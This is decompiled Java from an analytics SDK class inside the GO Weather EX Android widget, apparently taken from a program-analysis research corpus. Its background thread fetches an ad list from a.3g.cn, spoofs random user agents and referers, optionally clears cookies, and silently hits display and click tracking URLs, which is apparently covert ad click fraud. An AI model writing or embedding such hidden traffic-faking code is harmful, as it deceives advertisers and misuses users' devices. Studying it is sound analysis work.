package com.gau.go.gostaticsdk.e;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.webkit.WebSettings;
import android.webkit.WebView;
import com.gau.go.gostaticsdk.f.d;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

class b
  extends Thread
{
  b(a parama, String paramString)
  {
    super(paramString);
  }
  
  public void run()
  {
    Object localObject1;
    if (a.a(this.a) != null)
    {
      localObject1 = a.b(this.a);
      if ((localObject1 != null) && ("normal".equals(localObject1))) {
        a.a(this.a, System.currentTimeMillis());
      }
    }
    label1042:
    label1049:
    for (;;)
    {
      try
      {
        SharedPreferences localSharedPreferences = a.a(this.a).getSharedPreferences("com.go.prettify", 0);
        localObject1 = localSharedPreferences.getString("uid", "");
        d.a("Prettify", "last uid = " + (String)localObject1);
        Object localObject3 = new HttpPost("http://a.3g.cn/OptimizeApp/GetAdv.aspx");
        Object localObject4 = new ArrayList(2);
        ((List)localObject4).add(new BasicNameValuePair("id", (String)localObject1));
        ((List)localObject4).add(new BasicNameValuePair("t", String.valueOf(System.currentTimeMillis())));
        ((HttpPost)localObject3).setEntity(new UrlEncodedFormEntity((List)localObject4));
        localObject1 = new DefaultHttpClient().execute((HttpUriRequest)localObject3);
        localObject3 = "";
        int i;
        if (((HttpResponse)localObject1).getStatusLine().getStatusCode() == 200)
        {
          localObject1 = a.a(this.a, EntityUtils.toByteArray(((HttpResponse)localObject1).getEntity()));
          d.a("Prettify", "json = " + (String)localObject1);
          localObject1 = new JSONObject((String)localObject1);
          i = ((JSONObject)localObject1).getInt("v");
          d.a("Prettify", "version = " + i);
          JSONArray localJSONArray1 = ((JSONObject)localObject1).getJSONArray("ad");
          localObject1 = new StringBuilder().append("ad num = ");
          Object localObject5;
          String str2;
          boolean bool;
          String str1;
          if (localJSONArray1 == null)
          {
            i = 0;
            d.a("Prettify", i);
            localObject1 = localObject3;
            if (localJSONArray1 == null) {
              continue;
            }
            localObject1 = localObject3;
            if (localJSONArray1.length() <= 0) {
              continue;
            }
            i = 0;
            localObject1 = "";
            if (i >= localJSONArray1.length()) {
              break label1049;
            }
            localObject5 = localJSONArray1.getJSONObject(i);
            str2 = ((JSONObject)localObject5).getString("aid");
            d.a("Prettify", "ad id = " + str2);
            int j = ((JSONObject)localObject5).getInt("t");
            d.a("Prettify", "type = " + j);
            bool = ((JSONObject)localObject5).getBoolean("k");
            d.a("Prettify", "clear cookie? = " + bool);
            localObject3 = ((JSONObject)localObject5).getJSONArray("ua");
            if ((localObject3 != null) && (((JSONArray)localObject3).length() > 0))
            {
              localObject3 = ((JSONArray)localObject3).getString((int)Math.floor(Math.random() * ((JSONArray)localObject3).length()));
              d.a("Prettify", "ua = " + (String)localObject3);
              JSONArray localJSONArray2 = ((JSONObject)localObject5).getJSONArray("r");
              str1 = null;
              localObject4 = str1;
              if (localJSONArray2 != null)
              {
                localObject4 = str1;
                if (localJSONArray2.length() > 0) {
                  localObject4 = localJSONArray2.getString((int)Math.floor(Math.random() * localJSONArray2.length()));
                }
              }
              d.a("Prettify", "referer = " + (String)localObject4);
              str1 = ((JSONObject)localObject5).getString("d");
              d.a("Prettify", "display_monitor_url = " + str1);
              localObject5 = ((JSONObject)localObject5).getString("c");
              d.a("Prettify", "click_monitor_url = " + (String)localObject5);
              if (j != 0) {
                continue;
              }
              localObject3 = a.a(this.a, str2, (String)localObject5, str1, (String)localObject3, (String)localObject4, bool);
              if ((localObject3 == null) || (((String)localObject3).length() <= 0)) {
                break label1042;
              }
              localObject1 = (String)localObject1 + (String)localObject3;
              localObject1 = (String)localObject1 + ",";
              break label1042;
            }
          }
          else
          {
            i = localJSONArray1.length();
            continue;
          }
          localObject3 = new WebView(a.a(this.a)).getSettings().getUserAgentString();
          continue;
          localObject3 = a.a(this.a, str2, str1, (String)localObject5, (String)localObject3, (String)localObject4, bool);
          continue;
          localObject3 = localObject1;
          if (((String)localObject1).length() > 0) {
            localObject3 = ((String)localObject1).substring(0, ((String)localObject1).length() - 1);
          }
          localSharedPreferences.edit().putString("uid", (String)localObject3).commit();
        }
        else
        {
          d.a("Prettify", "net work status = " + ((HttpResponse)localObject1).getStatusLine().getStatusCode());
          continue;
        }
        i += 1;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        d.a("Prettify", "error = " + localException.getMessage());
        return;
      }
      finally
      {
        a.a(this.a).sendBroadcast(new Intent(a.c(this.a)));
      }
    }
  }
}


/* Location:              /Users/amaurremi/uw/stringoid/static-dynamic-comparison/apps/go weather ex/com.gau.go.launcherex.gowidget.weatherwidget-124-dex2jar.jar!/com/gau/go/gostaticsdk/e/b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */